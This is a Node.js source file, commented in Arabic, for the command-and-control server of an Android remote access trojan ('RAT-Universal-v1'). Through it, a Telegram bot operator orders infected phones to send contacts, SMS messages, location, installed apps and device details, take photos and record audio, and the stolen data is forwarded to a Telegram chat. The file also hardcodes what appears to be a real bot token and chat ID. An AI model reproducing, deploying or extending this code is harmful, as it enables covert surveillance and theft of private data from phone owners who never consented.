const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const { v4: uuidv4 } = require('uuid');
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");

// ⚙️ الإعدادات - يسهل تعديلها
const config = {
    token: '8454161104:AAGkY24bDk6wKL7AvVs40V0zUSYib6WZ9jA', // ضع توكن البوت هنا
    chatId: '7604667042', // ضع ID المحادثة هنا
    port: process.env.PORT || 8999,
    pingInterval: 30000
};

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(config.token, { polling: true });
const clients = new Map();
const upload = multer();
app.use(bodyParser.json());

// 🎯 بروتوكول الاتصال الموحد
const Protocol = {
    // أنواع الأوامر من الخادم إلى APK
    COMMANDS: {
        GET_CONTACTS: 'get_contacts',
        GET_MESSAGES: 'get_messages', 
        GET_LOCATION: 'get_location',
        GET_APPS: 'get_apps',
        GET_DEVICE_INFO: 'get_device_info',
        TAKE_PHOTO: 'take_photo',
        RECORD_AUDIO: 'record_audio',
        GET_FILES: 'get_files',
        SEND_SMS: 'send_sms',
        TOAST: 'show_toast',
        VIBRATE: 'vibrate',
        PING: 'ping'
    },
    
    // أنواع البيانات من APK إلى الخادم
    DATA_TYPES: {
        TEXT: 'TEXT:',
        FILE: 'FILE:',
        LOCATION: 'LOCATION:',
        STATUS: 'STATUS:',
        ERROR: 'ERROR:'
    }
};

// 📊 إحصائيات الخادم
const stats = {
    totalConnections: 0,
    activeConnections: 0,
    commandsExecuted: 0
};

// 🔧 Middleware للـ CORS (لتوافق أكبر)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, model, version, battery');
    next();
});

// 🌐 endpoints للـ HTTP (للتطبيقات التي لا تدعم WebSocket)
app.get("/", (req, res) => {
    res.json({
        status: "online",
        version: "2.0.0",
        protocol: "RAT-Universal-v1",
        connections: stats.activeConnections,
        totalConnections: stats.totalConnections
    });
});

app.get("/status", (req, res) => {
    res.json({
        status: "running",
        connectedDevices: Array.from(clients.values()).map(client => ({
            model: client.model,
            version: client.version,
            battery: client.battery,
            connectedSince: client.connectedAt
        })),
        stats: stats
    });
});

// 📨 endpoints لاستقبال البيانات من APK
app.post("/api/data", upload.single("file"), (req, res) => {
    try {
        const { deviceId, type, data } = req.body;
        const client = clients.get(deviceId);
        
        if (!client) {
            return res.status(404).json({ error: "Device not found" });
        }

        handleIncomingData(type, data, deviceId, req.file);
        res.json({ status: "received" });
    } catch (error) {
        console.error('Error in /api/data:', error);
        res.status(500).json({ error: "Internal server error" });
    }
});

app.post("/api/register", (req, res) => {
    try {
        const { model, version, battery, manufacturer, sdk } = req.body;
        const deviceId = uuidv4();
        
        const clientInfo = {
            id: deviceId,
            model: model || 'Unknown',
            version: version || 'Unknown',
            battery: battery || 'Unknown',
            manufacturer: manufacturer || 'Unknown',
            sdk: sdk || 'Unknown',
            ip: req.ip,
            connectedAt: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        };
        
        clients.set(deviceId, clientInfo);
        stats.totalConnections++;
        stats.activeConnections++;
        
        // إرسال إشعار الاتصال
        bot.sendMessage(config.chatId, 
            `📱 **جهاز جديد متصل**\n\n` +
            `• **الموديل:** ${clientInfo.model}\n` +
            `• **الإصدار:** ${clientInfo.version}\n` +
            `• **البطارية:** ${clientInfo.battery}\n` +
            `• **المصنع:** ${clientInfo.manufacturer}\n` +
            `• **ID:** ${deviceId}`, 
            { parse_mode: "Markdown" }
        );
        
        res.json({ 
            deviceId: deviceId,
            status: "registered",
            protocol: "RAT-Universal-v1"
        });
    } catch (error) {
        console.error('Error in /api/register:', error);
        res.status(500).json({ error: "Registration failed" });
    }
});

// 🔌 WebSocket Handler
wss.on("connection", (ws, req) => {
    const deviceId = uuidv4();
    const clientInfo = {
        id: deviceId,
        model: req.headers.model || 'Unknown',
        version: req.headers.version || 'Unknown',
        battery: req.headers.battery || 'Unknown',
        manufacturer: req.headers.manufacturer || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        ws: ws
    };
    
    clients.set(deviceId, clientInfo);
    stats.totalConnections++;
    stats.activeConnections++;
    
    console.log(`📱 New device connected: ${clientInfo.model} (${deviceId})`);
    
    // إرسال إشعار الاتصال
    bot.sendMessage(config.chatId, 
        `📱 **جهاز جديد متصل عبر WebSocket**\n\n` +
        `• **الموديل:** ${clientInfo.model}\n` +
        `• **الإصدار:** ${clientInfo.version}\n` +
        `• **البطارية:** ${clientInfo.battery}\n` +
        `• **IP:** ${clientInfo.ip}\n` +
        `• **ID:** ${deviceId}`, 
        { parse_mode: "Markdown" }
    );

    // معالجة الرسائل الواردة من APK
    ws.on('message', (data) => {
        try {
            clientInfo.lastSeen = new Date().toISOString();
            const message = data.toString();
            handleWebSocketMessage(message, deviceId);
        } catch (error) {
            console.error('Error handling WebSocket message:', error);
        }
    });

    ws.on('close', () => {
        handleDisconnection(deviceId);
    });

    ws.on('error', (error) => {
        console.error(`WebSocket error for ${deviceId}:`, error);
        handleDisconnection(deviceId);
    });
});

// 📨 معالجة البيانات الواردة
function handleWebSocketMessage(message, deviceId) {
    const client = clients.get(deviceId);
    if (!client) return;

    try {
        if (message.startsWith(Protocol.DATA_TYPES.TEXT)) {
            const textData = message.substring(Protocol.DATA_TYPES.TEXT.length);
            bot.sendMessage(config.chatId, 
                `📨 **بيانات نصية من ${client.model}**\n\n${textData}`,
                { parse_mode: "Markdown" }
            );
        }
        else if (message.startsWith(Protocol.DATA_TYPES.LOCATION)) {
            const locationData = message.substring(Protocol.DATA_TYPES.LOCATION.length).split(',');
            if (locationData.length >= 2) {
                const lat = parseFloat(locationData[0]);
                const lon = parseFloat(locationData[1]);
                bot.sendLocation(config.chatId, lat, lon);
                bot.sendMessage(config.chatId, 
                    `📍 **موقع من ${client.model}**\n\nالخطوط: ${lat}\nالدوائر: ${lon}`,
                    { parse_mode: "Markdown" }
                );
            }
        }
        else if (message.startsWith(Protocol.DATA_TYPES.STATUS)) {
            const statusData = message.substring(Protocol.DATA_TYPES.STATUS.length);
            console.log(`Status from ${client.model}: ${statusData}`);
        }
        else if (message.startsWith(Protocol.DATA_TYPES.ERROR)) {
            const errorData = message.substring(Protocol.DATA_TYPES.ERROR.length);
            bot.sendMessage(config.chatId, 
                `❌ **خطأ من ${client.model}**\n\n${errorData}`,
                { parse_mode: "Markdown" }
            );
        }
        else {
            // معالجة كـ JSON للرسائل المعقدة
            try {
                const jsonData = JSON.parse(message);
                handleJSONMessage(jsonData, deviceId);
            } catch {
                // إذا فشل التحليل كـ JSON، تعامل معه كنص عادي
                bot.sendMessage(config.chatId, 
                    `📨 **بيانات من ${client.model}**\n\n${message}`,
                    { parse_mode: "Markdown" }
                );
            }
        }
    } catch (error) {
        console.error('Error handling message:', error);
    }
}

function handleJSONMessage(data, deviceId) {
    const client = clients.get(deviceId);
    if (!client || !data.type) return;

    switch (data.type) {
        case 'contacts':
            bot.sendMessage(config.chatId, 
                `📒 **جهات اتصال من ${client.model}**\n\n${JSON.stringify(data.data, null, 2)}`,
                { parse_mode: "Markdown" }
            );
            break;
        case 'messages':
            bot.sendMessage(config.chatId, 
                `💬 **رسائل من ${client.model}**\n\n${JSON.stringify(data.data, null, 2)}`,
                { parse_mode: "Markdown" }
            );
            break;
        case 'apps':
            bot.sendMessage(config.chatId, 
                `📱 **تطبيقات من ${client.model}**\n\n${JSON.stringify(data.data, null, 2)}`,
                { parse_mode: "Markdown" }
            );
            break;
        default:
            bot.sendMessage(config.chatId, 
                `📊 **بيانات من ${client.model}**\n\nالنوع: ${data.type}\nالبيانات: ${JSON.stringify(data.data, null, 2)}`,
                { parse_mode: "Markdown" }
            );
    }
}

function handleDisconnection(deviceId) {
    const client = clients.get(deviceId);
    if (client) {
        clients.delete(deviceId);
        stats.activeConnections--;
        
        bot.sendMessage(config.chatId, 
            `🔌 **انقطع الاتصال بالجهاز**\n\n` +
            `• **الموديل:** ${client.model}\n` +
            `• **مدة الاتصال:** ${Math.round((new Date() - new Date(client.connectedAt)) / 1000)} ثانية\n` +
            `• **ID:** ${deviceId}`,
            { parse_mode: "Markdown" }
        );
        
        console.log(`🔌 Device disconnected: ${client.model} (${deviceId})`);
    }
}

// 🤖 Telegram Bot Handlers
bot.on("message", (msg) => {
    if (msg.chat.id.toString() !== config.chatId) {
        bot.sendMessage(msg.chat.id, "❌ غير مصرح بالوصول");
        return;
    }

    if (msg.text === "/start") {
        showMainMenu(msg.chat.id);
    }
    else if (msg.text === "📊 الحالة") {
        sendStatus(msg.chat.id);
    }
    else if (msg.text === "📱 الأجهزة") {
        showDevicesList(msg.chat.id);
    }
});

function showMainMenu(chatId) {
    const menu = {
        reply_markup: {
            keyboard: [
                ["📱 الأجهزة", "📊 الحالة"],
                ["⚙️ الإعدادات", "🆘 المساعدة"]
            ],
            resize_keyboard: true
        }
    };
    
    bot.sendMessage(chatId, 
        `🤖 **بوت التحكم العالمي**\n\n` +
        `• الإصدار: 2.0.0\n` +
        `• البروتوكول: RAT-Universal-v1\n` +
        `• الأجهزة النشطة: ${stats.activeConnections}\n\n` +
        `اختر من القائمة:`,
        { parse_mode: "Markdown", ...menu }
    );
}

function sendStatus(chatId) {
    const statusText = 
        `📊 **حالة الخادم**\n\n` +
        `• **الحالة:** 🟢 نشط\n` +
        `• **الأجهزة النشطة:** ${stats.activeConnections}\n` +
        `• **إجمالي الاتصالات:** ${stats.totalConnections}\n` +
        `• **الأوامر المنفذة:** ${stats.commandsExecuted}\n` +
        `• **وقت التشغيل:** ${Math.round(process.uptime())} ثانية\n\n` +
        `**الأجهزة المتصلة:**\n${getConnectedDevicesList()}`;
    
    bot.sendMessage(chatId, statusText, { parse_mode: "Markdown" });
}

function showDevicesList(chatId) {
    if (clients.size === 0) {
        bot.sendMessage(chatId, "❌ لا توجد أجهزة متصلة");
        return;
    }

    const buttons = [];
    clients.forEach((client, deviceId) => {
        buttons.push([
            { 
                text: `📱 ${client.model} (${client.battery}%)`, 
                callback_data: `device:${deviceId}`
            }
        ]);
    });

    bot.sendMessage(chatId, "📋 اختر الجهاز:", {
        reply_markup: { inline_keyboard: buttons }
    });
}

function getConnectedDevicesList() {
    if (clients.size === 0) return "لا توجد أجهزة";
    
    let list = "";
    clients.forEach((client, deviceId) => {
        const connectionTime = Math.round((new Date() - new Date(client.connectedAt)) / 1000);
        list += `• ${client.model} (${client.battery}%) - ${connectionTime}ث\n`;
    });
    return list;
}

// معالجة الأوامر من التليجرام
bot.on("callback_query", (callback) => {
    const [action, deviceId] = callback.data.split(':');
    
    if (action === 'device') {
        showDeviceCommands(callback.message.chat.id, deviceId, callback.message.message_id);
    }
    else if (action.startsWith('cmd_')) {
        const command = action.replace('cmd_', '');
        executeCommand(deviceId, command, callback.message.chat.id);
    }
});

function showDeviceCommands(chatId, deviceId, messageId) {
    const client = clients.get(deviceId);
    if (!client) {
        bot.editMessageText("❌ الجهاز لم يعد متصلاً", {
            chat_id: chatId,
            message_id: messageId
        });
        return;
    }

    const commands = [
        [{ text: "📒 جهات الاتصال", callback_data: `cmd_contacts:${deviceId}` }],
        [{ text: "💬 الرسائل", callback_data: `cmd_messages:${deviceId}` }],
        [{ text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` }],
        [{ text: "📱 التطبيقات", callback_data: `cmd_apps:${deviceId}` }],
        [{ text: "📸 الكاميرا", callback_data: `cmd_camera:${deviceId}` }],
        [{ text: "🎤 الميكروفون", callback_data: `cmd_microphone:${deviceId}` }],
        [{ text: "📊 معلومات الجهاز", callback_data: `cmd_info:${deviceId}` }],
        [{ text: "🔄 تحديث", callback_data: `device:${deviceId}` }]
    ];

    bot.editMessageText(
        `🎯 **التحكم في ${client.model}**\n\n` +
        `• البطارية: ${client.battery}\n` +
        `• الإصدار: ${client.version}\n` +
        `• متصل منذ: ${Math.round((new Date() - new Date(client.connectedAt)) / 1000)} ثانية`,
        {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: commands }
        }
    );
}

function executeCommand(deviceId, command, chatId) {
    const client = clients.get(deviceId);
    if (!client) {
        bot.sendMessage(chatId, "❌ الجهاز لم يعد متصلاً");
        return;
    }

    let wsCommand;
    switch (command) {
        case 'contacts': wsCommand = Protocol.COMMANDS.GET_CONTACTS; break;
        case 'messages': wsCommand = Protocol.COMMANDS.GET_MESSAGES; break;
        case 'location': wsCommand = Protocol.COMMANDS.GET_LOCATION; break;
        case 'apps': wsCommand = Protocol.COMMANDS.GET_APPS; break;
        case 'camera': wsCommand = Protocol.COMMANDS.TAKE_PHOTO; break;
        case 'microphone': wsCommand = Protocol.COMMANDS.RECORD_AUDIO; break;
        case 'info': wsCommand = Protocol.COMMANDS.GET_DEVICE_INFO; break;
        default: return;
    }

    if (client.ws && client.ws.readyState === webSocket.OPEN) {
        client.ws.send(wsCommand);
        stats.commandsExecuted++;
        bot.sendMessage(chatId, `✅ تم إرسال الأمر: ${wsCommand}`);
    } else {
        bot.sendMessage(chatId, "❌ لا يمكن الاتصال بالجهاز حالياً");
    }
}

// 🕒 Ping للأجهزة المتصلة
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.readyState === webSocket.OPEN) {
            ws.send(Protocol.COMMANDS.PING);
        }
    });
}, config.pingInterval);

// 🚀 تشغيل الخادم
server.listen(config.port, () => {
    console.log(`🚀 Server running on port ${config.port}`);
    console.log(`📡 WebSocket server ready for connections`);
    console.log(`🤖 Bot initialized with token: ${config.token ? '✅' : '❌'}`);
});

module.exports = { app, server, config };
